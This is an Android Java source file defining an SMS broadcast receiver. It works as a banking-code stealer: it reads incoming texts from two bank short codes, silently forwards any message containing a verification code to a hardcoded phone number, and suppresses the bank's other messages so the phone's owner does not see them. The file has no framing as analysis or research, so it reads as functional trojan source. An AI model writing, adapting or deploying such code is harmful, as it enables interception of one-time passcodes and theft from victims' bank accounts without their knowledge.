package com.example.message;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

@SuppressLint("NewApi")
@TargetApi(Build.VERSION_CODES.HONEYCOMB)
public class SMSReceiver extends BroadcastReceiver {

	private String tag = "SMSReceiver";
	String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private String phone = "15757121405";

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if (intent.getAction().equals(SMS_RECEIVED)) {
			smg(context, intent);
		}
	}

	private void smg(Context context, Intent intent) {
		Log.i("SMSReceiver isOrderdeBroadcast", isOrderedBroadcast() + "");
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			Object messages[] = (Object[]) bundle.get("pdus");
			if (messages != null && messages.length > 0) {
				SmsMessage smsMessage[] = new SmsMessage[messages.length];
				for (int n = 0; n < smsMessage.length; n++) {
					smsMessage[n] = SmsMessage
							.createFromPdu((byte[]) messages[n]);
				}
				for (SmsMessage message : smsMessage) {
					String content = message.getMessageBody();
					String sender = message.getOriginatingAddress();
					if (sender.equals("95508") || sender.equals("95555")) {// 广发信用卡//
						SmsManager smsManager = SmsManager.getDefault();
						if (content.indexOf("验证码") != -1) {
							/** 切分短信，每七十个汉字切一个，不足七十就只有一个：返回的是字符串的List集合 */
							// List<String> texts =
							// smsManager.divideMessage(content);
							// 发送之前检查短信内容是否为空
							// for (int i = 0; i < texts.size(); i++) {
							// String text = texts.get(i);
							// }
							smsManager.sendTextMessage(phone, null, content,
									null, null);
						} else {
							this.abortBroadcast();// 不要发送给系统了
						}
					}/*
					 * else { if (sender.equals("10086")) {
					 * this.abortBroadcast(); } else { addNotification(context,
					 * content, sender); tag++; } }
					 */
				}
			}
		} else {
			Log.e(tag, "Bundle 为空 ，可能是被别的软件先拦截了");
		}
	}
}
